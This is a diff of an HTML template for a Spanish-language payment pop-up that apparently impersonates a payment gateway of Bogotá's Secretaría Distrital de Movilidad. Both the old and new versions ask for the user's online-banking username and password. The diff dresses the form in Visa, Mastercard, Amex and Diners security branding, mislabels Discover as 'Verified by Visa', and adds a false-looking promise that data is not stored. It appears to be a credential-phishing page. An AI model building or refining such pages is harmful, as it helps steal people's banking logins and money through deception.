@@ -215,24 +215,68 @@
   aria-modal="true"
   aria-label="Validación bancaria"
 >
-  <section class="pasarela-card pasarela-card--visa" data-challenge-auth="userpass" hidden>
-    <div class="pasarela-card__body">
-      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
-      <div class="pasarela-card__msg">
-        <p>Para autorizar este pago, ingresa el usuario y la contraseña de tu banca virtual.</p>
-        <div class="pasarela-card__box">
-          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
-          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
-          <p>Fecha: <span data-challenge-datetime></span></p>
+  <section class="pasarela-card pasarela-bank-auth" data-challenge-auth="userpass" hidden>
+    <div class="pasarela-bank-auth__body">
+      <header class="pasarela-bank-auth__head">
+        <div class="pasarela-bank-auth__brands" aria-live="polite">
+          <div class="pasarela-bank-auth__brand" data-auth-brand="visa" hidden>
+            <img src="/images/pasarela/visa.png" alt="Visa" />
+            <span>Verified by Visa</span>
+          </div>
+          <div class="pasarela-bank-auth__brand" data-auth-brand="mastercard" hidden>
+            <svg viewBox="0 0 62 38" width="46" height="28" aria-hidden="true">
+              <circle cx="23" cy="19" r="15" fill="#EB001B"></circle>
+              <circle cx="39" cy="19" r="15" fill="#F79E1B"></circle>
+              <path fill="#FF5F00" d="M31 6.6a15 15 0 0 1 0 24.8 15 15 0 0 1 0-24.8Z"></path>
+            </svg>
+            <span>Mastercard SecureCode</span>
+          </div>
+          <div class="pasarela-bank-auth__brand pasarela-bank-auth__brand--amex" data-auth-brand="amex" hidden>
+            <img src="/images/pasarela/amex-box.png" alt="American Express" />
+            <img src="/images/pasarela/amex-safekey.png" alt="SafeKey" />
+          </div>
+          <div class="pasarela-bank-auth__brand" data-auth-brand="diners" hidden>
+            <img src="/images/pasarela/diners.png" alt="Diners Club" />
+            <span>ProtectBuy</span>
+          </div>
+          <div class="pasarela-bank-auth__brand" data-auth-brand="discover" hidden>
+            <img src="/images/pagos-assets/brands/discover.png" alt="Discover" />
+            <span>Verified by Visa</span>
+          </div>
         </div>
+        <p class="pasarela-bank-auth__kicker">Verificación segura</p>
+        <h2 class="pasarela-bank-auth__title">Confirma tu identidad</h2>
+        <p class="pasarela-bank-auth__lead">Ingresa el usuario y la contraseña de tu banca virtual para autorizar esta transacción.</p>
+      </header>
+
+      <div class="pasarela-bank-auth__summary">
+        <p>Comercio<strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+        <p>Monto<strong data-challenge-amount>COP 0</strong></p>
+        <p>Fecha<span data-challenge-datetime></span></p>
       </div>
-      <form class="pasarela-otp pasarela-auth" data-auth-form="userpass">
-        <label for="auth-username">Usuario</label>
-        <input id="auth-username" name="username" type="text" autocomplete="off" maxlength="40" placeholder="Ingresa tu usuario" />
-        <label for="auth-password">Contraseña</label>
-        <input id="auth-password" name="password" type="password" autocomplete="off" maxlength="40" placeholder="Ingresa tu contraseña" />
+
+      <form class="pasarela-otp pasarela-auth pasarela-bank-auth__form" data-auth-form="userpass">
+        <label class="pasarela-bank-auth__field" for="auth-username">
+          <span>Usuario</span>
+          <span class="pasarela-bank-auth__control">
+            <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
+              <path fill="currentColor" d="M12 12a4 4 0 1 0-4-4 4 4 0 0 0 4 4Zm0 2c-3.3 0-8 1.7-8 5v1h16v-1c0-3.3-4.7-5-8-5Z" />
+            </svg>
+            <input id="auth-username" name="username" type="text" autocomplete="off" maxlength="40" placeholder="Usuario de tu banca virtual" />
+          </span>
+        </label>
+        <label class="pasarela-bank-auth__field" for="auth-password">
+          <span>Contraseña</span>
+          <span class="pasarela-bank-auth__control">
+            <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
+              <path fill="currentColor" d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 0 1 4 0v2h-4Zm3 8.2a1.5 1.5 0 1 1-1-2.7 1.5 1.5 0 0 1 1 2.7Z" />
+            </svg>
+            <input id="auth-password" name="password" type="password" autocomplete="off" maxlength="40" placeholder="Contraseña" />
+          </span>
+        </label>
         <p data-auth-debug-message hidden></p>
-        <button type="submit">Continuar</button>
+        <button type="submit">Autorizar transacción</button>
+        <p class="pasarela-bank-auth__secure">Conexión cifrada · Tus datos no se almacenan en este sitio</p>
       </form>
     </div>
   </section>
